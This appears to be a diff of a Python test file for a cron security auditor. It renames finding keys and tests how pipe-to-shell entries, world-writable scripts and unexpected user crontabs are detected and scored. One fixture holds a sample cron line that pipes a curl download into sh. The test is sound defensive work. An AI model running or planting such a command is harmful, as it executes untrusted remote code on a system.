@@ -57,7 +57,7 @@ def base_snapshot(**kwargs) -> CronAuditSnapshot:
 class TestAllOk:
     def test_empty_snapshot_returns_ok(self):
         result = check_cron_audit(base_snapshot())
-        assert _has_finding(result, "cron_audit.ok", FindingLevel.OK)
+        assert _has_finding(result, "cron.ok", FindingLevel.OK)
 
     def test_empty_snapshot_no_deduction(self):
         result = check_cron_audit(base_snapshot())
@@ -66,7 +66,7 @@ class TestAllOk:
     def test_ok_not_emitted_when_finding_present(self):
         snap = base_snapshot(pipe_to_shell_entries=["entry"])
         result = check_cron_audit(snap)
-        assert not _has_finding(result, "cron_audit.ok", FindingLevel.OK)
+        assert not _has_finding(result, "cron.ok", FindingLevel.OK)
 
 
 # ---------------------------------------------------------------------------
@@ -77,7 +77,7 @@ class TestPipeToShell:
     def test_pipe_entry_produces_warn(self):
         snap = base_snapshot(pipe_to_shell_entries=["/etc/cron.d/update: curl http://x | sh"])
         result = check_cron_audit(snap)
-        assert _has_finding(result, "cron_audit.pipe_to_shell", FindingLevel.WARN)
+        assert _has_finding(result, "cron.pipe_to_shell", FindingLevel.WARN)
 
     def test_pipe_entry_deducts_2_points(self):
         # business rule: penalty is flat per category regardless of occurrence count
@@ -88,7 +88,7 @@ class TestPipeToShell:
     def test_pipe_entry_deduction_key(self):
         snap = base_snapshot(pipe_to_shell_entries=["entry"])
         result = check_cron_audit(snap)
-        assert "cron_audit.pipe_to_shell" in _deduction_keys(result)
+        assert "cron.pipe_to_shell" in _deduction_keys(result)
 
     def test_flat_deduction_regardless_of_count(self):
         # business rule: multiple pipe-to-shell entries → single flat penalty
@@ -99,7 +99,7 @@ class TestPipeToShell:
     def test_nature_is_action(self):
         snap = base_snapshot(pipe_to_shell_entries=["entry"])
         result = check_cron_audit(snap)
-        finding = _get_finding(result, "cron_audit.pipe_to_shell")
+        finding = _get_finding(result, "cron.pipe_to_shell")
         assert finding is not None
         assert finding.nature == "action"
 
@@ -118,7 +118,7 @@ class TestWorldWritableScripts:
     def test_world_writable_produces_warn(self):
         snap = base_snapshot(world_writable_scripts=["/etc/cron.daily/backup.sh"])
         result = check_cron_audit(snap)
-        assert _has_finding(result, "cron_audit.world_writable", FindingLevel.WARN)
+        assert _has_finding(result, "cron.world_writable", FindingLevel.WARN)
 
     def test_world_writable_deducts_1_point(self):
         # business rule: flat penalty regardless of number of world-writable scripts
@@ -129,7 +129,7 @@ class TestWorldWritableScripts:
     def test_world_writable_deduction_key(self):
         snap = base_snapshot(world_writable_scripts=["/tmp/script.sh"])
         result = check_cron_audit(snap)
-        assert "cron_audit.world_writable" in _deduction_keys(result)
+        assert "cron.world_writable" in _deduction_keys(result)
 
     def test_flat_deduction_regardless_of_script_count(self):
         # business rule: flat per category
@@ -140,7 +140,7 @@ class TestWorldWritableScripts:
     def test_nature_is_action(self):
         snap = base_snapshot(world_writable_scripts=["/tmp/script.sh"])
         result = check_cron_audit(snap)
-        finding = _get_finding(result, "cron_audit.world_writable")
+        finding = _get_finding(result, "cron.world_writable")
         assert finding is not None
         assert finding.nature == "action"
 
@@ -148,7 +148,7 @@ class TestWorldWritableScripts:
         """The fix command must reference the affected script path."""
         snap = base_snapshot(world_writable_scripts=["/tmp/script.sh"])
         result = check_cron_audit(snap)
-        finding = _get_finding(result, "cron_audit.world_writable")
+        finding = _get_finding(result, "cron.world_writable")
         assert finding is not None
         assert "/tmp/script.sh" in finding.cmd
 
@@ -156,7 +156,7 @@ class TestWorldWritableScripts:
         """A world-writable finding must always carry a fix command."""
         snap = base_snapshot(world_writable_scripts=["/tmp/script.sh"])
         result = check_cron_audit(snap)
-        finding = _get_finding(result, "cron_audit.world_writable")
+        finding = _get_finding(result, "cron.world_writable")
         assert finding is not None
         assert finding.cmd
 
@@ -169,7 +169,7 @@ class TestUnexpectedUserCrons:
     def test_unexpected_user_produces_info(self):
         snap = base_snapshot(unexpected_user_crons=["alice"])
         result = check_cron_audit(snap)
-        assert _has_finding(result, "cron_audit.unexpected_users", FindingLevel.INFO)
+        assert _has_finding(result, "cron.unexpected_users", FindingLevel.INFO)
 
     def test_unexpected_user_no_deduction(self):
         snap = base_snapshot(unexpected_user_crons=["alice"])
@@ -179,12 +179,12 @@ class TestUnexpectedUserCrons:
     def test_unexpected_user_no_ok(self):
         snap = base_snapshot(unexpected_user_crons=["alice"])
         result = check_cron_audit(snap)
-        assert not _has_finding(result, "cron_audit.ok", FindingLevel.OK)
+        assert not _has_finding(result, "cron.ok", FindingLevel.OK)
 
     def test_multiple_unexpected_users(self):
         snap = base_snapshot(unexpected_user_crons=["alice", "bob"])
         result = check_cron_audit(snap)
-        assert _has_finding(result, "cron_audit.unexpected_users", FindingLevel.INFO)
+        assert _has_finding(result, "cron.unexpected_users", FindingLevel.INFO)
         assert _deduction_points(result) == 0
 
 
@@ -222,8 +222,8 @@ class TestCombined:
         )
         result = check_cron_audit(snap)
         assert _deduction_points(result) == 1
-        assert _has_finding(result, "cron_audit.world_writable", FindingLevel.WARN)
-        assert _has_finding(result, "cron_audit.unexpected_users", FindingLevel.INFO)
+        assert _has_finding(result, "cron.world_writable", FindingLevel.WARN)
+        assert _has_finding(result, "cron.unexpected_users", FindingLevel.INFO)
 
 
 # ---------------------------------------------------------------------------
@@ -304,7 +304,7 @@ class TestEdgeCases:
         )
         result = check_cron_audit(snap)
         assert isinstance(result.findings, list)
-        assert _has_finding(result, "cron_audit.ok", FindingLevel.OK)
+        assert _has_finding(result, "cron.ok", FindingLevel.OK)
 
     def test_none_lists_produce_no_deduction(self):
         """None fields must be treated as empty — no spurious deductions."""
@@ -340,5 +340,5 @@ class TestEdgeCases:
         )
         result = check_cron_audit(snap)
         keys = set(_finding_keys(result))
-        assert "cron_audit.pipe_to_shell" in keys
-        assert "cron_audit.world_writable" in keys
+        assert "cron.pipe_to_shell" in keys
+        assert "cron.world_writable" in keys
